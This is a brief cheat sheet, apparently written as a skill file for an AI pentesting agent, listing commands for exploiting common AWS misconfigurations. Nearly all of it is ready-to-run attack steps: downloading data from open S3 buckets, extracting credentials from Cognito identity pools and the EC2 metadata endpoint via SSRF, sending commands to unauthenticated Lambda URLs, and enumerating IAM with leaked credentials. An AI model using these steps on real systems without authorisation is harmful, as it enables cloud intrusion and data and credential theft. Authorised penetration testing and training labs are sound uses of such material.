# SKILL: AWS Cloud Misconfiguration
## Version: 1.0 | Domain: infra

---

## TOP FINDINGS
### S3 bucket misconfig
```bash
aws s3 ls s3://target-bucket --no-sign-request
aws s3 cp s3://target-bucket/sensitive.db . --no-sign-request
```

### Open Cognito Identity Pool
```bash
aws cognito-identity get-id --identity-pool-id us-east-1:xxx --no-sign-request
aws cognito-identity get-credentials-for-identity --identity-id $ID --no-sign-request
# Returns temporary AWS creds → enumerate with them
aws sts get-caller-identity
aws s3 ls
aws iam list-roles
```

### Lambda function URL with AuthType NONE
```bash
curl -X POST https://xxx.lambda-url.us-east-1.on.aws/ -d '{"cmd":"id"}'
```

### EC2 metadata SSRF (via web vuln)
```
http://169.254.169.254/latest/meta-data/iam/security-credentials/
```

### SNS/SQS exposed
```bash
aws sns list-topics --no-sign-request
aws sqs receive-message --queue-url https://sqs.us-east-1.amazonaws.com/123/queue --no-sign-request
```

### IAM misconfig
```bash
# With leaked creds
aws iam list-attached-user-policies --user-name compromised-user
aws iam list-user-policies --user-name compromised-user
```

## TOOLS
- prowler, scoutsuite, pacu (post-exploit), cloudsplaining, enumerate-iam

## REFERENCES
Rhino Security Labs • flaws.cloud / flaws2.cloud
